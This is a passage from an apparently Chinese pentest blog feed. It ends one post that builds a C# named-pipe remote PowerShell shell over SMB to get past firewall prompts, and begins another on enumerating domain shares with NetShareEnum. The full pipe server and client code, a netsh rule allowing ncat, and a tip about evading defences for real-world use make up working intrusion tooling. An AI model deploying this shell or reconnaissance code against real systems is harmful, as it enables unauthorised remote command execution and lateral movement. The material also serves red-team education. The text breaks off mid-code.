会弹窗提示是否允许此程序进行网络连接，只有用户点击允许访问才可放行。当然，如果我们拥有管理员权限，可以将此程序添加到白名单中，允许连接。但我们这里使用的普通用户权限，是无法添加修改防火墙规则的。所以当无权限进行修改时，注定会弹窗提示，也意味着我们的此攻击操作注定失败。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加的防火墙规则</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"ncat.exe"</span> dir=<span class="keyword">in</span> program=<span class="string">"E:\Code\Ncat\ncat.exe"</span> action=allow</span><br></pre></td></tr></table></figure><p>如果不添加防火墙规则，则会出现下图情况。</p><p><img src="\image\【知识回顾】命名管道\blog_2019-10-27_12-12-03.png" alt=""></p><p>这种情下，<code>Reverse shell</code> 也是会失败的，那么我们该如何绕过这种限制呢？</p><p><strong>其实，这个很简单：</strong> <em>我们就直接利用防火墙默认允许的规则就行。</em></p><p>在 Windows 中，通常默认允许 <strong>SMB 协议</strong> 出入站，因此，如果有什么功能或机制可以用于与外部机器进行通信的，<strong>SMB 协议</strong> 无疑是一种很好的选择。而 <strong>【知识回顾】命名管道</strong> 就是基于 <em>SMB 协议</em> 进行通信的，所以我们可以基于【知识回顾】命名管道与外部机器进行通信，从而建立控制通道。</p><h2 id="0x02-【知识回顾】命名管道"><a href="#0x02-【知识回顾】命名管道" class="headerlink" title="0x02 【知识回顾】命名管道"></a>0x02 【知识回顾】命名管道</h2><p><a href="https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes" target="_blank" rel="noopener">“命名管道”</a> 又名 “命名管线”，但是通常都叫命名管道，是一种简单基于 <code>SMB 协议</code>的进程间通信（Internet Process Connection - <em>IPC</em>）机制。 在计算机编程里，命名管道可在同一台计算机的不同进程之间或在跨越一个网络的不同计算机的不同进程之间，支持可靠的、单向或双向的数据通信传输。<strong>这完全符合我们的需求</strong>。</p><p>和一般的管道不同，命名管道可以被不同进程以不同的方式方法调用（可以跨语言、跨平台）。只要程序知道命名管道的名字，任何进程都可以通过该名字打开管道的另一端，根据给定的权限和服务器进程通信。  </p><p>默认情况下，我们无法使用命名管道来控制计算机通信，但是微软提供了很多种 Windows API 函数，例如 ：</p><ul><li>用于实例化命名管道的服务器端函数是 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/Winbase/nf-winbase-createnamedpipea" target="_blank" rel="noopener"><strong>CreateNamedPipe</strong></a></li><li>接受连接的服务器端功能是 <a href="https://msdn.microsoft.com/en-us/library/Aa365146(v=VS.85" target="_blank" rel="noopener"><strong>ConnectNamedPipe</strong></a>.aspx)</li><li>客户端进程通过使用 <a href="https://docs.microsoft.com/windows/desktop/api/fileapi/nf-fileapi-createfilea" target="_blank" rel="noopener"><strong>CreateFile</strong></a> 或 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/Winbase/nf-winbase-callnamedpipea" target="_blank" rel="noopener"><strong>CallNamedPipe </strong></a>函数连接到命名管道</li></ul><p><strong>命名规范</strong></p><p>命名管道的命名是采用的 <strong>UNC 格式</strong>：<code>\\Server\Pipe\[Path]Name</code> 的。 </p><p>第一部分<code>\\Server</code>指定了服务器的名字，命名管道服务即在此服务器创建，其字符串部分可表示为一个小数点(表示本机)、星号(当前网络字段)、域名或是一个真正的服务；第二部分 <code>\Pipe</code> 与邮槽的 <code>\Mailslot</code> 一样是一个不可变化的硬编码字串，以指出该文件是从属于 NTFS；第三部分<code>[Path]Name</code>则使应用程序可以唯一定义及标识一个命名管道的名字，而且可以设置多级目录。 </p><p> 在 <code>C#</code>中，若要实现命名管道，如今只需要使用 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.io.pipes.namedpipeserverstream" target="_blank" rel="noopener">NamedPipeServerStream</a> 和 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.io.pipes.namedpipeclientstream" target="_blank" rel="noopener">NamedPipeClientStream</a> 类，开盒即食。 </p><h2 id="0x03-使用-C-实现"><a href="#0x03-使用-C-实现" class="headerlink" title="0x03 使用 C#实现"></a>0x03 使用 <code>C#</code>实现</h2><p>命名管道既可以支持直接字节传输模式（<code>PipeTransmissionMode.Byte</code>），也可以支持消息传输模式（<code>PipeTransmissionMode.Message</code>） 。</p><ul><li><p>在字节模式中，信息以连续字节流的形式在客户与服务器之间流动。这也就意味着对于客户机应用和服务器应用在任何一个特定的时间段内都无法准确知道有多少字节从管道中读出或写入。在这种通信模式中，一方在向管道写入某个数量的字节后并不能保证管道的另一方能读出等量的字节。</p></li><li><p>对于消息模式，客户机和服务器则是通过一系列不连续的数据包进行数据的收发。从管道发出的每一条消息都必须作为一条完整的消息读入。</p></li></ul><p>在此建议使用消息模式。 下面先看看字节模式。</p><h3 id="3-1、-测试服务端代码"><a href="#3-1、-测试服务端代码" class="headerlink" title="3.1、 测试服务端代码"></a>3.1、 测试服务端代码</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">WaitData</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 创建命名管道</span></span><br><span class="line">    <span class="keyword">using</span> (NamedPipeServerStream pipeServer =</span><br><span class="line">           <span class="keyword">new</span> NamedPipeServerStream(<span class="string">"testpipe"</span>, PipeDirection.InOut, <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Waiting for client connection..."</span>);</span><br><span class="line">            <span class="comment">// 等待连接</span></span><br><span class="line">            pipeServer.WaitForConnection();</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Client connected."</span>);</span><br><span class="line">            <span class="comment">// 指定传输模式</span></span><br><span class="line">            pipeServer.ReadMode = PipeTransmissionMode.Byte;</span><br><span class="line">            <span class="keyword">using</span> (StreamReader sr = <span class="keyword">new</span> StreamReader(pipeServer))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">string</span> con = sr.ReadToEnd();</span><br><span class="line">                Console.WriteLine(con);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2、测试客户端代码"><a href="#3-2、测试客户端代码" class="headerlink" title="3.2、测试客户端代码"></a>3.2、测试客户端代码</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SendData</span>(<span class="params"><span class="keyword">string</span> ServerName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 连接服务端命名管道</span></span><br><span class="line">        <span class="keyword">using</span> (NamedPipeClientStream pipeClient =</span><br><span class="line">               <span class="keyword">new</span> NamedPipeClientStream(ServerName, <span class="string">"testpipe"</span>, PipeDirection.InOut, PipeOptions.None, TokenImpersonationLevel.None))</span><br><span class="line">        &#123;</span><br><span class="line">            pipeClient.Connect();</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Connection established succesfully."</span>);</span><br><span class="line">            <span class="keyword">using</span> (StreamWriter sw = <span class="keyword">new</span> StreamWriter(pipeClient))</span><br><span class="line">            &#123;</span><br><span class="line">                sw.WriteLine(<span class="string">"xixixi"</span>);</span><br><span class="line">                sw.Flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3、测试结果"><a href="#3-3、测试结果" class="headerlink" title="3.3、测试结果"></a>3.3、测试结果</h3><p><img src="\image\【知识回顾】命名管道\blog_2019-10-26_21-29-45.png" alt=""></p><p>此项测试使用的是字节传输模式（<code>PipeTransmissionMode.Byte</code>）。但为了执行命令，我们将上面的代码改成了 <code>PipeTransmissionMode.Message</code> 模式，并且需要引入之前在翻译文章 <a href="https://www.anquanke.com/post/id/189152" target="_blank" rel="noopener">丢掉Powershell.exe来渗透测试</a> 中看到的执行命令的一个方法。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">RunScript</span>(<span class="params"><span class="keyword">string</span> script</span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    Runspace MyRunspace = RunspaceFactory.CreateRunspace();</span><br><span class="line">    MyRunspace.Open();</span><br><span class="line">    Pipeline MyPipeline = MyRunspace.CreatePipeline(); </span><br><span class="line">    MyPipeline.Commands.AddScript(script);</span><br><span class="line">    MyPipeline.Commands.Add(<span class="string">"Out-String"</span>);</span><br><span class="line">    Collection&lt;PSObject&gt; outputs = MyPipeline.Invoke();</span><br><span class="line">    MyRunspace.Close();</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder(); </span><br><span class="line">    <span class="keyword">foreach</span> (PSObject pobject <span class="keyword">in</span> outputs) </span><br><span class="line">    &#123; </span><br><span class="line">        sb.AppendLine(pobject.ToString()); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.ToString(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-shell-实现"><a href="#0x04-shell-实现" class="headerlink" title="0x04 shell 实现"></a>0x04 shell 实现</h2><p>我们完全可以按照 <code>Psexec</code> 的原理，自己构建一个命令执行的通道。</p><h3 id="4-1、服务端实现"><a href="#4-1、服务端实现" class="headerlink" title="4.1、服务端实现"></a>4.1、服务端实现</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">WaitData</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个运行空间</span></span><br><span class="line">    Runspace runspace = <span class="literal">null</span>;</span><br><span class="line">    runspace = RunspaceFactory.CreateRunspace();</span><br><span class="line">    runspace.ApartmentState = System.Threading.ApartmentState.STA; </span><br><span class="line">    runspace.Open();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">using</span> (<span class="keyword">var</span> pipeServer = <span class="keyword">new</span> NamedPipeServerStream(</span><br><span class="line">            <span class="string">"testpipe"</span>,</span><br><span class="line">            PipeDirection.InOut,</span><br><span class="line">            NamedPipeServerStream.MaxAllowedServerInstances,</span><br><span class="line">            PipeTransmissionMode.Message))</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Waiting for client connection..."</span>);</span><br><span class="line">            pipeServer.WaitForConnection();</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Client connected."</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> messageBytes = ReadMessage(pipeServer);</span><br><span class="line">                <span class="keyword">var</span> line = Encoding.Default.GetString(messageBytes);</span><br><span class="line">                Console.WriteLine(<span class="string">"[*] Received: &#123;0&#125;"</span>, line);</span><br><span class="line">                <span class="keyword">if</span> (line.ToLower() == <span class="string">"exit"</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 参考：https://decoder.cloud/2017/11/02/we-dont-need-powershell-exe/</span></span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    Pipeline PsPipe = runspace.CreatePipeline();</span><br><span class="line">                    PsPipe.Commands.AddScript(line);</span><br><span class="line">                    PsPipe.Commands.Add(<span class="string">"Out-String"</span>);</span><br><span class="line">                    Collection&lt;PSObject&gt; results = PsPipe.Invoke();</span><br><span class="line">                    StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    <span class="keyword">foreach</span> (PSObject obj <span class="keyword">in</span> results)</span><br><span class="line">                    &#123;</span><br><span class="line">                        stringBuilder.AppendLine(obj.ToString());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">var</span> response = Encoding.Default.GetBytes(stringBuilder.ToString());</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        pipeServer.Write(response, <span class="number">0</span>, response.Length);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(<span class="string">"[!] Pipe is broken!"</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2、客户端实现"><a href="#4-2、客户端实现" class="headerlink" title="4.2、客户端实现"></a>4.2、客户端实现</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SendData</span>(<span class="params"><span class="keyword">string</span> ServerName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Console.WriteLine(<span class="string">"[+] Connecting to "</span> + ServerName);</span><br><span class="line">    <span class="keyword">using</span> (<span class="keyword">var</span> pipeClient = <span class="keyword">new</span> NamedPipeClientStream(ServerName, <span class="string">"testpipe"</span>, PipeDirection.InOut))</span><br><span class="line">    &#123;</span><br><span class="line">        pipeClient.Connect(<span class="number">5000</span>);</span><br><span class="line">        pipeClient.ReadMode = PipeTransmissionMode.Message;</span><br><span class="line">        Console.WriteLine(<span class="string">"[+] Connection established succesfully."</span>);</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;   </span><br><span class="line">            Console.Write(<span class="string">"csexec&gt; "</span>);</span><br><span class="line">            <span class="keyword">var</span> input = Console.ReadLine();</span><br><span class="line">            <span class="keyword">if</span> (String.IsNullOrEmpty(input)) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = Encoding.Default.GetBytes(input);</span><br><span class="line">            pipeClient.Write(bytes, <span class="number">0</span>, bytes.Length);</span><br><span class="line">            <span class="keyword">if</span> (input.ToLower() == <span class="string">"exit"</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">var</span> result = ReadMessage(pipeClient);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            Console.WriteLine(Encoding.Default.GetString(result));</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3、测试结果"><a href="#4-3、测试结果" class="headerlink" title="4.3、测试结果"></a>4.3、测试结果</h3><p><img src="\image\【知识回顾】命名管道\blog_2019-10-26_21-41-09.png" alt=""></p><p>注意：此时的操作，是根据当前 <code>Client</code> 的权限进行的。</p><p><img src="\image\【知识回顾】命名管道\blog_2019-10-27_11-47-54.png" alt=""></p><p>抓包看看此时的网络情况。</p><p><img src="\image\【知识回顾】命名管道\blog_2019-10-27_12-36-47.png" alt=""></p><p><img src="\image\【知识回顾】命名管道\blog_2019-10-27_12-37-26.png" alt=""></p><p>这整个过程与 <code>Psexec</code> 差不多一致，只是缺少了与  服务控制管理器（SCM） 进行通信的过程。整个过程中防火墙和反病毒程序无任何阻拦。如果要应用于实战中，可以将内容先进行加密在进行传输。</p><p>这里再说一个关于平时常用的 <code>IPC$</code>。</p><p><code>IPC</code> 中文翻译网络进程连接服务，也就是说这个是为 <strong>“进程”</strong> 间建立网络连接而存在的服务，说的再明确点就是：<code>IPC$</code> 是一个为 “各类进程” 建立网络通信连接而存在的服务。 </p><p>那么，为什么 <code>SMB Beacon</code> 中，为什么不需要账号密码呢？这个问题留给你们探索！！！</p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/io/how-to-use-named-pipes-for-network-interprocess-communication" target="_blank" rel="noopener">如何：使用命名管道进行网络进程间通信</a><br><a href="https://www.cnblogs.com/HDK2016/p/9840989.html" target="_blank" rel="noopener">【C#】解析C#中管道流的使用</a><br><a href="https://segmentfault.com/a/1190000003116875" target="_blank" rel="noopener">命名管道实践</a><br><a href="https://github.com/malcomvetter/NamedPipes" target="_blank" rel="noopener">NamedPipes</a><br><a href="https://docs.microsoft.com/zh-cn/windows/win32/ipc/named-pipes" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/ipc/named-pipes</a><br><a href="https://decoder.cloud/2017/11/02/we-dont-need-powershell-exe/" target="_blank" rel="noopener">We don’t need powershell.exe</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是根据之前文章中涉及到的命名管道的一个理解和延伸进行编写的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;PS&lt;/em&gt;&lt;/strong&gt;：本文开始是投稿于安全客。但由于和别的稿件冲突了，相比下另一篇在原理探究，利用上会稍详尽一些些。只能说两篇文章是从不同角度进行的，建议结合阅读，文章连接：&lt;a href=&quot;https://www.anquanke.com/post/id/190207#h2-0&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Windows 命名管道研究初探&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="知识回顾" scheme="https://rcoil.me/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】获取域内机器共享</title>
    <link href="https://rcoil.me/2019/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E6%9C%BA%E5%99%A8%E5%85%B1%E4%BA%AB/"/>
    <id>https://rcoil.me/2019/11/【域渗透】获取域内机器共享/</id>
    <published>2019-11-01T11:06:48.000Z</published>
    <updated>2019-11-01T02:28:51.843Z</updated>
    
    <content type="html"><![CDATA[<p>在域内遇到瓶颈时，不妨看看域内机器开放的共享，获取有些收获。<br><a id="more"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>大多数内网渗透总结在提到使用 <code>WinAPI枚举系统</code> 只是讲述了利用 <code>NetSessionEnum</code> 来找寻<code>登陆 sessions</code>， 利用 <code>NetWkstaUserEnum</code> 来枚举登陆的用户，利用 <code>NetShareEnum</code> 来找寻共享，但却未说明其原型理论。由于前篇文章 <a href="[https://rcoil.me/2019/10/【域渗透】域内会话收集/](https://rcoil.me/2019/10/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9F%9F%E5%86%85%E4%BC%9A%E8%AF%9D%E6%94%B6%E9%9B%86/">【域渗透】域内会话收集</a>) 已经针对 <code>NetSessionEnum</code> 和 <code>NetWkstaUserEnum</code>  进行说明，所以本文是对 <code>NetShareEnum</code> 做一个概述及应用的补充。</p><h2 id="0x01-NetShareEnum-函数"><a href="#0x01-NetShareEnum-函数" class="headerlink" title="0x01 NetShareEnum 函数"></a>0x01 NetShareEnum 函数</h2><p>以当前权限检索有关服务器上每个共享资源的信息。还可以使用 <a href="https://docs.microsoft.com/windows/desktop/api/winnetwk/nf-winnetwk-wnetenumresourcea" target="_blank" rel="noopener">WNetEnumResource</a> 函数来检索资源信息。但是，<strong>WNetEnumResource</strong>不会枚举隐藏的共享或连接到共享的用户。</p><p>该函数原型为：</p><p><img src="/image/【域渗透】获取域内机器共享/blog_2019-10-16_17-15-43.png" alt=""></p><p>它需要 7 个参数。</p><ul><li><p><strong>servername：</strong>指向一个字符串的指针，该字符串指定要在其上执行该功能的远程服务器的DNS或NetBIOS名称。如果此参数为<strong>NULL</strong>，则使用本地计算机</p></li><li><p><strong>level：</strong>指定数据的信息级别。</p><p>  | 值    | <strong>含义</strong>                                   |<br>  | —- | —————————————- |<br>  | 0    | 返回共享名称。所述<em>bufptr</em>参数指向的数组 <a href="https://docs.microsoft.com/windows/desktop/api/lmshare/ns-lmshare-share_info_0" target="_blank" rel="noopener">SHARE_INFO_0</a>结构。 |<br>  | 1    | 返回有关共享资源的信息，包括资源的名称和类型以及与资源关联的注释。所述<em>bufptr</em>参数指向的数组 <a href="https://docs.microsoft.com/windows/desktop/api/lmshare/ns-lmshare-share_info_1" target="_blank" rel="noopener">SHARE_INFO_1</a>结构。 |<br>  | 2    | 返回有关共享资源的信息，包括资源名称，类型和权限，密码以及连接数。所述<em>bufptr</em>参数指向的数组 <a href="https://docs.microsoft.com/windows/desktop/api/lmshare/ns-lmshare-share_info_2" target="_blank" rel="noopener">SHARE_INFO_2</a>结构。 |<br>  | 502  | 返回有关共享资源的信息，包括资源名称，类型和权限，连接数以及其他相关信息。所述<em>bufptr</em>参数指向的数组 <a href="https://docs.microsoft.com/windows/desktop/api/lmshare/ns-lmshare-share_info_502" target="_blank" rel="noopener">SHARE_INFO_502</a>结构。不返回来自不同范围的共享。有关范围界定的更多信息，请参见<a href="https://docs.microsoft.com/windows/desktop/api/lmserver/nf-lmserver-netservertransportaddex" target="_blank" rel="noopener">NetServerTransportAddEx</a>函数的文档的“备注”部分。 |<br>  | 503  | 返回有关共享资源的信息，包括资源名称，类型和权限，连接数以及其他相关信息。所述<em>bufptr</em>参数指向的数组<a href="https://docs.microsoft.com/windows/desktop/api/lmshare/ns-lmshare-share_info_503" target="_blank" rel="noopener">SHARE_INFO_503</a>结构。返回所有范围的共享。如果此结构的<strong>shi503_servername</strong>成员为“ *”，则没有配置的服务器名称，并且<strong>NetShareEnum</strong>函数枚举所有未作用域名称的共享。<strong>Windows Server 2003和Windows XP：</strong>  不支持此信息级别。 |</p></li><li><p><strong>bufptr：</strong>向接收数据的缓冲区的指针。该数据的格式取决于 <em>level</em> 参数的值。</p></li><li><p><strong>prefmaxlen：</strong>指定返回数据的首选最大长度，以字节为单位。如果指定<strong>MAX_PREFERRED_LENGTH</strong>，则该函数分配数据所需的内存量。如果在此参数中指定另一个值，则它可以限制函数返回的字节数。如果缓冲区大小不足以容纳所有条目，则该函数返回<strong>ERROR_MORE_DATA</strong>。</p></li><li><strong>entriesread：</strong>指向一个值的指针，该值接收实际枚举的元素数。</li><li><p><strong>totalentries：</strong>指向一个值的值，该值接收可能已经枚举的条目总数。</p></li><li><p><strong>resume_handle：</strong>指向包含恢复句柄的值的指针，该恢复句柄用于继续现有的共享搜索。</p></li></ul><p>而此 API 的调用示例为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> server = <span class="string">"rcoil.me"</span>;</span><br><span class="line"><span class="keyword">int</span> ret = NetShareEnum(server, <span class="number">1</span>, <span class="keyword">ref</span> bufPtr, MAX_PREFERRED_LENGTH, <span class="keyword">ref</span> entriesread, <span class="keyword">ref</span> totalentries, <span class="keyword">ref</span> resume_handle);</span><br></pre></td></tr></table></figure><p>它会返回如下内容：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shi1_netname - ADMIN$</span><br><span class="line">shi1_remark - Remote management</span><br><span class="line">shi1_netname - C$</span><br><span class="line">shi1_remark -<span class="built_in"> Default </span>share</span><br><span class="line">shi1_netname - SYSVOL</span><br><span class="line">shi1_remark - Logon<span class="built_in"> server </span>share</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure><p>关键源码如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 返回指定计算机所开放的共享，并返回 SHARE_INFO_1[] 数组结构</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> https://www.pinvoke.net/default.aspx/netapi32/netshareenum.html</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="Server"&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SHARE_INFO_1[] <span 